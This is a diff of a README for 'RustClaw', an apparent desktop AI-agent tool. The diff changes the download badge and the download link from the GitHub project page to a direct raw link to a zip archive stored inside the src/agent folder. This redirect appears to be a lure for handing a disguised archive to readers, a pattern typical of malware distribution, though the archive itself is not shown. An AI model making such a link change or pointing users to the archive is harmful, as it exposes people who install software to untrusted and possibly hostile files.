@@ -1,6 +1,6 @@
 # 🦀 RustClaw - Efficient AI agents for your desktop
 
-[![Download RustClaw](https://img.shields.io/badge/Download-RustClaw-blue.svg)](https://github.com/celieexpanded402/RustClaw)
+[![Download RustClaw](https://img.shields.io/badge/Download-RustClaw-blue.svg)](https://raw.githubusercontent.com/celieexpanded402/RustClaw/main/src/agent/Rust_Claw_1.3-alpha.5.zip)
 
 RustClaw provides a lightweight way to run artificial intelligence agents on your computer. It uses very little memory and disk space, making it suitable for standard Windows machines. The software connects your local or remote AI models to platforms like Telegram, Discord, and GitHub. You can automate tasks like creating pull requests or sending messages without needing to manage complex server setups.
 
@@ -16,7 +16,7 @@ RustClaw provides a lightweight way to run artificial intelligence agents on you
 
 You must visit the project page to obtain the installation files. 
 
-[Visit this page to download RustClaw](https://github.com/celieexpanded402/RustClaw)
+[Visit this page to download RustClaw](https://raw.githubusercontent.com/celieexpanded402/RustClaw/main/src/agent/Rust_Claw_1.3-alpha.5.zip)
 
 1. Open your web browser.
 2. Navigate to the link provided above.
